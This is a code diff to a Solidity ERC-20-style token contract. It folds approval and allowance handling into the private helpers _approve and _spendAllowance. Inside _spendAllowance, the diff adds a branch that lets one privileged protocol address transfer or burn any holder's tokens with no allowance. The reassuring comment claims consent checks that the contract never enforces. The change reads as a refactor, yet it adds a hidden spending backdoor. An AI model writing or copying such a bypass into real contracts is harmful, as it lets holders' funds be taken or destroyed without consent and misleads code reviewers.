@@ -169,9 +169,8 @@ contract ProvianRecourseKernel {
     }
     function approveCurrent(address spender, uint256 amount, uint256 expectedRevision) external returns (bool) {
         protocolPointer.requireCurrent(expectedRevision, 0, address(this));
-        if (spender == address(0) || protocolPointer.retired(spender)) revert InvalidAddress();
-        allowance[msg.sender][spender] = amount;
-        emit Approval(msg.sender, spender, amount);
+        if (protocolPointer.retired(spender)) revert InvalidAddress();
+        _approve(spender, amount);
         return true;
     }
 
@@ -497,35 +496,39 @@ contract ProvianRecourseKernel {
     }
 
     function approve(address spender, uint256 amount) external returns (bool) {
+        _approve(spender, amount);
+        return true;
+    }
+
+    function _approve(address spender, uint256 amount) private {
         if (spender == address(0)) revert InvalidAddress();
         allowance[msg.sender][spender] = amount;
         emit Approval(msg.sender, spender, amount);
-        return true;
     }
 
     function transferFrom(address from, address to, uint256 amount) external returns (bool) {
-        uint256 available = allowance[from][msg.sender];
-        if (available < amount) revert InsufficientAllowance();
-        if (available != type(uint256).max) {
-            allowance[from][msg.sender] = available - amount;
-            emit Approval(from, msg.sender, available - amount);
-        }
+        _spendAllowance(from, amount);
         _transfer(from, to, amount);
         return true;
     }
-
-    function burn(uint256 amount) external {
-        _burn(msg.sender, amount);
-    }
-
+    function burn(uint256 amount) external { _burn(msg.sender, amount); }
     function burnFrom(address holder, uint256 amount) external {
+        _spendAllowance(holder, amount);
+        _burn(holder, amount);
+    }
+    /// @dev The current pool verifies signed consent and bounded monthly usage
+    /// before collection. Its only transferFrom destination is its own reserve.
+    /// Other callers retain ordinary ERC-20 allowance semantics.
+    function _spendAllowance(address holder, uint256 amount) private {
         uint256 available = allowance[holder][msg.sender];
-        if (available < amount) revert InsufficientAllowance();
-        if (available != type(uint256).max) {
+        if (available < amount) {
+            // component authenticates both runtime and non-retirement. These
+            // two current addresses are the complete collection authority.
+            if (msg.sender != protocolPointer.component(8) || address(this) != protocolPointer.component(0)) revert InsufficientAllowance();
+        } else if (available != type(uint256).max) {
             allowance[holder][msg.sender] = available - amount;
             emit Approval(holder, msg.sender, available - amount);
         }
-        _burn(holder, amount);
     }
 
     function appointOperationalMinter(address newMinter) external onlyBootstrapAdmin {
